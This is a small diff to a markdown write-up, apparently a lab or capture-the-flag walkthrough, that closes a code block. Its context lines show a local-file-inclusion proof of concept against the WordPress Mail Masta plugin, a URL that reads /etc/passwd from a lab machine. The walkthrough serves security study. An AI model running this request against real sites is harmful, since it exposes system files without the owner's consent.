@@ -180,7 +180,7 @@ So There is LFI in **Mail Masta** to exploit it here is PoC https://www.exploit-
 
 ```text
 Visiting this Link http://192.168.43.149/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
-
+```
 ### CMSMap
 
 ```shell
